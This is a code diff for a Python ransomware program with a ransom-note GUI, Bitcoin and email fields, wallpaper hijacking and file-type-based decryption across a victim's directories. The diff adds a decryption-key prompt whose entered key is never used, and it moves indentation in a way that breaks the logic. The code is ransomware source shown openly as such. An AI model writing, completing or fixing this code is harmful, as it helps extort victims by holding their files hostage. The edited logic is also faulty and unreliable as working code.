@@ -22,6 +22,7 @@ import pytz
 import psutil
 import socket
 from datetime import datetime, timedelta
+from PyQt5.QtWidgets import QLineEdit, QMessageBox, QInputDialog
 
 # Initialize global variables
 SPI_SETDESKWALLPAPER = 0x0014
@@ -234,12 +235,13 @@ class Worker(QObject):
             QThread.msleep(100)
 
 class RansomwareGUI(QMainWindow):
-    def __init__(self):
+    def __init__(self, decryptionPass):
         super().__init__()
 
         # Initialize global variables
         self.btcAdd = ""
         self.email = ""
+        self.decryptionPass = decryptionPass
 
         # Define ransom note
         self.ransomNote = f"""
@@ -269,7 +271,10 @@ class RansomwareGUI(QMainWindow):
         ransomware_instance.sendMessage()
         ransomware_instance.readMe()
 
-            # Add decryption button
+        # Store decryption passkey
+        self.decryptionPass = decryptionPass
+
+        # Add decryption button
         decrypt_button = QPushButton('Decrypt', self)
         decrypt_button.setStyleSheet("""
             QPushButton{
@@ -284,8 +289,8 @@ class RansomwareGUI(QMainWindow):
             }
         """)
         self.layout.addWidget(decrypt_button)
-        decrypt_button.clicked.connect(self.decryptFiles)
-        
+        decrypt_button.clicked.connect(self.promptDecryptionKey)
+
         # Add decryption progress bars
         self.decryption_progress_bars = [QProgressBar(self) for _ in range(3)]
         for progress_bar in self.decryption_progress_bars:
@@ -295,23 +300,37 @@ class RansomwareGUI(QMainWindow):
                     color: #fff;                                
                 }
             """)
+    
+    def promptDecryptionKey(self):
+        # Prompt for decryption key
+        text, ok = QInputDialog.getText(self, "Enter Decryption Key", "Enter your decryption key:")
+
+        if ok:
+            decryption_key = text
+            self.decryptFiles()
 
     def decryptFiles(self):
         decryption_key = self.decryptionPass  # Use the decryption key generated during encryption
         if decryption_key:
             ransomware_instance = Ransomware()
-            for root, directories, files in os.walk(ransomware_instance.filePath):
-                for filename in files:
-                    filepath = os.path.join(root, filename)
-                    for base in fileTypes:
-                        if base in filepath:
-                            threading.Thread(target=ransomware_instance.decryptFile, args=(filepath, decryption_key)).start()
-                for directory in directories:  # Iterating over subdirectories
+        for root, directories, files in os.walk(ransomware_instance.filePath):
+            for filename in files:
+                filepath = os.path.join(root, filename)
+                for base in fileTypes:
+                    if base in filepath:
+                        threading.Thread(target=ransomware_instance.decryptFile, args=(filepath, decryption_key)).start()
+            for directory in directories:  # Iterating over subdirectories
+                try:
                     for filename in os.listdir(os.path.join(root, directory)):
                         filepath = os.path.join(root, directory, filename)
                         for base in fileTypes:
                             if base in filepath:
                                 threading.Thread(target=ransomware_instance.decryptFile, args=(filepath, decryption_key)).start()
+                except PermissionError as e:
+                    print(f"PermissionError: {e}. Skipping directory: {directory}")  
+
+
+
 
 
 
@@ -488,6 +507,7 @@ if __name__ == '__main__':
 
     # Call the function to set the wallpaper
     set_wallpaper(image_filename)
+    decryption_key = Ransomware().decryptionPass
     app = QApplication(sys.argv)
-    gui = RansomwareGUI()
+    gui = RansomwareGUI(decryption_key)
     sys.exit(app.exec_())
